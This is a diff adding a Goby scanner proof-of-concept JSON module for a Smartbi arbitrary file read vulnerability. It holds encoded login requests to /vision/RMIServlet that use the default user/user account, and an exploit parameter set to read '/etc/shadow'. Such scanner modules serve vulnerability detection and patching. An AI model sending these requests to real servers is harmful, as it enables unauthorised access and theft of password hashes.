@@ -1,0 +1,179 @@
+{
+  "Name": "Smartbi存在任意文件读取漏洞，具有普通用户权限的攻击者利用该漏洞可以读取任意文件",
+  "Description": "Smartbi是企业级商业智能和大数据分析平台，经过多年的持续发展，整合了各行业的数据分析和决策支持的功能需求，包括企业级报表、数据可视化分析、自助分析平台、数据挖掘建模、AI智能分析等。此系统多用于银行、保险、证券、国有企业、政府和教育领域。",
+  "Product": "Smartbi",
+  "Homepage": "http://www.smartbi.com.cn/",
+  "DisclosureDate": "2020-08-06",
+  "Author": "gobysec@gmail.com",
+  "FofaQuery": "app=\"Smartbi\"|| body=\"gcfutil = jsloader.resolve('smartbi.gcf.gcfutil')\"",
+  "Level": "1",
+  "Impact": "具有普通用户权限(user/user)的攻击者可以读取任意文件,受影响的范围有： Smartbi V9、V8、V7、V6",
+  "Recommendation": "官网下载补丁更新:http://oss.smartbi.com.cn:82/insight/",
+  "References": [
+    "http://fofa.so"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+	{
+      "Name": "filename",
+      "Type": "input",
+      "Value": "/etc/shadow"
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+            "OR",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/vision/RMIServlet",
+                        "follow_redirect": false,
+						"header": {
+								"Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        "data_type": "text",
+                        "data": "encode=zDp4Wp4gRip+iSRiG8w-R6+/JV/uuQDp4/uu/ut/uuQDp4/uu/JT"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "100",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "testtest",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": ["jessionid|lastheader|regex|JSESSIONID=(.+);"]
+            },
+            {
+                  "Request": {
+						"set_variable": ["coderequestEn|define|text|twddw6Wp4gRip+Sw(hx4wdL4w5xRSp+/JV/uu/uxpki/ux5(DDbh/uu/JT"],
+                        "method": "POST",
+                        "uri": "/vision/RMIServlet",
+						"header": {
+								"Content-Type": "application/x-www-form-urlencoded",
+                              "Cookie": "JSESSIONID={{{jessionid}}}"
+                        },
+                        "follow_redirect": false,
+                        "data_type": "text",
+                        "data": "encode={{{coderequestEn}}}"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "OKOvc",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            },
+			{
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/vision/RMIServlet",
+                        "follow_redirect": false,
+                        "header": {
+								"Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        "data_type": "text",
+                        "data": "encode=zDp4Wp4gRip+iSRiG8w-R6+/JV/uuQDp4/uu/ut/uuQDp4/uu/JT"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "testtest",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "jessionid|lastheader|regex|JSESSIONID=(.+);"
+                  ]
+            },
+            {
+                  "Request": {
+						"set_variable": ["coderequestEn|define|text|twddw6Wp4gRip+Sw(hx4wdL4w5xRSp+/JV/uu/uxpki/ux5(DDbh/uu/JT"],
+                        "method": "POST",
+                        "uri": "/vision/RMIServlet",
+						"header": {
+								"Content-Type": "application/x-www-form-urlencoded",
+                              "Cookie": "JSESSIONID={{{jessionid}}}"
+                        },
+                        "follow_redirect": false,
+                        "data_type": "text",
+                        "data": "encode={{{coderequestEn}}}"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "OKOvc",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+  "ExploitSteps": null,
+  "Tags": ["fileread","defaultaccount"],
+  "CVEIDs": null,
+  "CVSSScore": null,
+  "AttackSurfaces": {
+    "Application": ["Smartbi"],
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}
